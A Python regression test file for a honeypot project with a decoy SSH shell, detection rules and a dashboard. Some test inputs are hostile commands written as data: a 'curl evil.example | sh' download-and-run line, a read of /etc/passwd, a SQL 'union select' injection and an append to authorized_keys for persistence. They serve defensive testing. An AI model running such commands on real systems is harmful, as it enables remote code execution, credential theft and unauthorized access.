"""Regression tests for the problems found in the October audit."""

import json
from datetime import UTC, datetime, timedelta

import httpx
from fastapi.testclient import TestClient

from dashboard.app import create_app
from decoys.banners import listeners
from decoys.ssh.shell import ShellState, run
from qlure import replay
from qlure.cli import main as cli
from qlure.correlate import rules
from qlure.correlate.ioc import IOCSet, match_event
from qlure.correlate.model import Actor, RuleHit, Session
from qlure.events import Action, Event, Service, emit
from qlure.store import db, forwarder
from qlure.store.verify import verify

T0 = datetime(2026, 10, 9, 12, 0, tzinfo=UTC)


def _event(action, service="ssh", **extra):
    return Event.model_validate(
        {
            "event_id": extra.pop("event_id", f"e-{action}-{len(str(extra))}"),
            "ts": extra.pop("ts", T0),
            "service": service,
            "src_ip": "203.0.113.5",
            "session_id": "s1",
            "action": action,
            **extra,
        }
    )


def _session(events):
    return Session("s", events[0].service.value, "203.0.113.5", None, events)


def test_ls_with_flags_lists_the_directory_instead_of_failing():
    state = ShellState(user="deploy")
    out = run("ls -la", state)
    assert "cannot access" not in out and ".bash_history" in out and "notes.txt" in out
    assert run("cat -n notes.txt", state).startswith("Deploy checklist")


def test_chained_and_piped_commands_answer_each_part():
    state = ShellState(user="deploy")
    assert run("whoami; id", state).startswith("deploy\nuid=1001(deploy)")
    assert run("whoami && hostname", state) == "deploy\nveltrix-app-01\n"
    assert run("cat notes.txt | grep backups", state) == "- backups run from cron at 02:00\n"
    assert run("bash -c 'curl evil.example | sh'", state) == ""  # quoted: still one command


def test_mysql_greeting_salt_changes_per_connection():
    first, second = listeners.next_mysql_greeting(), listeners.next_mysql_greeting()
    assert first != second  # the same salt every time is a known honeypot tell


def test_kill_chain_with_a_lowered_family_threshold_does_not_crash(monkeypatch):
    config = rules.load_config()
    monkeypatch.setitem(config["rules"]["R10"]["threshold"], "families", 2)
    hit = RuleHit("R2", "x", "recon", 1, "low", (), "m", "t", ("a",), T0)
    later = RuleHit("R7", "x", "misuse", 1, "high", (), "m", "t", ("b",), T0 + timedelta(1))
    chain = rules.r10_kill_chain(Actor("a", []), [hit, later])
    assert chain is not None and chain.measured == "recon, then misuse"


def test_shell_typing_is_not_called_an_injection():
    events = [
        _event("command", event_id="c1", request={"command": "cat /etc/passwd; cd ../app"}),
    ]
    assert rules.r5_injection(_session(events)) is None


def test_api_requests_are_counted_once_for_injection():
    request = {"method": "GET", "path": "/api/v1/users", "query": "id=1 union select 1"}
    events = [
        _event("http_request", "api", event_id="h1", request=request),
        _event("api_call", "api", event_id="a1", request=request),
    ]
    assert rules.r5_injection(_session(events)).measured.endswith("in 1 request(s)")


def test_writing_authorized_keys_by_path_is_persistence():
    command = "echo ssh-ed25519 AAAA >> ~/.ssh/authorized_keys"
    events = [_event("command", event_id="c1", request={"command": command})]
    hit = rules.r8_post_login(_session(events))
    assert hit is not None and "persistence" in hit.measured


def test_verify_notices_the_newest_events_deleted_from_the_store(log_dir, tmp_path):
    conn = db.connect(tmp_path / "qlure.db")
    for i in range(3):
        emit(
            {
                "service": Service.WEB,
                "src_ip": "192.0.2.1",
                "session_id": "s",
                "action": Action.HTTP_REQUEST,
                "request": {"path": f"/{i}"},
            }
        )
    forwarder.forward_once(conn, log_dir)
    assert verify(conn, log_dir)[1] is None
    conn.execute("DELETE FROM events WHERE seq = (SELECT MAX(seq) FROM events)")
    conn.commit()
    _, problem = verify(conn, log_dir)
    assert problem is not None and problem.reason == "event was removed from the store"


def _dashboard(log_dir, tmp_path, monkeypatch):
    monkeypatch.setenv("QLURE_SETTINGS", str(tmp_path / "settings.json"))
    monkeypatch.setenv("QLURE_DASHBOARD_PASSWORD", "pw")
    emit(
        {
            "service": Service.WEB,
            "src_ip": "192.0.2.1",
            "session_id": "s",
            "action": Action.HTTP_REQUEST,
            "request": {"path": "/"},
        }
    )
    conn = db.connect(tmp_path / "qlure.db")
    forwarder.forward_once(conn, log_dir)
    client = TestClient(create_app(tmp_path / "qlure.db", log_dir), base_url="http://testserver")
    client.post("/login", data={"password": "pw"})
    return client, conn


def test_clear_all_needs_the_box_ticked_and_is_audited(log_dir, tmp_path, monkeypatch):
    client, conn = _dashboard(log_dir, tmp_path, monkeypatch)
    assert client.post("/clear", follow_redirects=False).status_code == 400
    assert conn.execute("SELECT COUNT(*) FROM events").fetchone()[0] == 1
    assert client.post("/clear", data={"confirm": "yes"}, follow_redirects=False).status_code == 303
    assert conn.execute("SELECT COUNT(*) FROM events").fetchone()[0] == 0
    assert (log_dir / "web.jsonl").read_text() == ""  # the app's own log folder, not $QLURE_LOGS
    row = conn.execute("SELECT key, outcome FROM config_audit").fetchone()
    assert (row["key"], row["outcome"]) == ("data.clear", "applied")
    assert verify(conn, log_dir)[1] is None


def test_clear_all_is_refused_in_judge_mode(log_dir, tmp_path, monkeypatch):
    client, conn = _dashboard(log_dir, tmp_path, monkeypatch)
    (tmp_path / "settings.json").write_text(json.dumps({"judge_mode": True}))
    assert client.post("/clear", data={"confirm": "yes"}).status_code == 403
    assert conn.execute("SELECT COUNT(*) FROM events").fetchone()[0] == 1


def test_replay_makes_one_client_per_visitor(monkeypatch):
    made = []

    class Fake:
        def __init__(self, **kwargs):
            made.append(self)

        def request(self, *args, **kwargs):
            return None

        def close(self):
            pass

    monkeypatch.setattr(httpx, "Client", Fake)
    requests = [replay.Request(T0, "GET", "/", {"user-agent": "a"}) for _ in range(5)]
    assert replay.run(requests, "http://w", "http://a", "token").sent == 5
    assert len(made) == 1


def test_capture_labels_without_a_run_folder_is_an_error_not_a_crash(capsys):
    assert cli(["capture", "labels"]) == 1
    assert "run folder" in capsys.readouterr().err


def test_ipv6_indicators_match_in_any_spelling():
    iocs = IOCSet.from_indicators({"indicators": [{"type": "ipv6-addr", "value": "2001:DB8:0::1"}]})
    hits = match_event({"src_ip": "2001:db8::1"}, iocs)
    assert [(h.indicator_type, h.value) for h in hits] == [("ipv6-addr", "2001:db8::1")]
